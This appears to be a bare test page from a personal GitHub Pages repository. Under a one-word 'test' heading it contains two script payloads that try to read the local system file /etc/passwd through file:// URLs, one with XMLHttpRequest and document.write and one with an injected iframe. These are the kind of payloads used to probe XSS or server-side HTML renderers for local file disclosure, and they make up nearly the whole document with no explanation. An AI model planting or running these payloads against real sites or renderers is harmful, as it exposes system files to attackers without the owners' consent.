# rikiaji.github.io
test
<script>
	x=new XMLHttpRequest;
	x.onload=function(){
		document.write(this.responseText)
	};
	x.open("GET","file:///etc/passwd");
	x.send();
</script>

<script>document.write('<iframe src=file:///etc/passwd></iframe>');</script>
